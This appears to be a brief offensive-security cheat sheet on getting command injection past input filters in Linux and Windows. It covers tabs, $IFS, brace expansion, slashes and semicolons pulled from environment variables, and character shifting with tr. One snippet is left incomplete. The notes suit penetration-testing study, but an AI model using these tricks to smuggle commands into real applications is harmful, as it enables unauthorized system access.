

### Space Filter Bypass
- Using tabs (%09)
- Using the ($IFS) (Linux Environment Variable default value its tab and a space)
- Bash Brace Expansion
	-  Eg. {ls,-la}

### Slash and Semicolon Filter Bypass Linux

get all environment variables available
```
printenv
```

extract slashes by using environment variables(x=start char index y=string length)
```shell-session
${PATH:x:y}
```
**Note: Can use $HOME and $PWD as well here

getting semicolons for injection
```shell-session
${LS_COLORS:10:1}
```


### Slash and Semicolon Filter Bypass Windows

get all environment variables
```
Get-ChildItem Env:
```

extract slashes by using environment variables(x=start char index y=end index)
```
```cmd-session
%HOMEPATH:~x,-y%
```

powershell environment variable usage
```powershell-session
$env:HOMEPATH[0
```


Character shifting to bypass filter(X=character before desired character)
```shell-session
$(tr '!-}' '"-~'<<<X)
```